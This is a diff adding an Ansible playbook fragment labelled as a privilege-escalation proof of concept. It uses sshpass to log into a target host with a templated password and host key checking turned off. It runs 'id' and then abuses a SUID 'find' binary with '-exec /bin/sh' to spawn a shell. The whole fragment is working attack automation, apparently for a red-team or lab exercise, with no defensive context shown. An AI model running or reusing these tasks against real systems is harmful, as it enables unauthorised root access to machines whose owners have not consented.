@@ -1,0 +1,13 @@
+---
+- name: PoC3 Privilege Escalation – SSH pivot
+  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} 'id'"
+  register: ssh_result
+  failed_when: false
+
+- name: Show SSH result
+  debug:
+    var: ssh_result.stdout
+
+- name: PoC3 Privilege Escalation – SUID Exploit
+  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} 'find . -exec /bin/sh \; -quit'"
+  failed_when: false
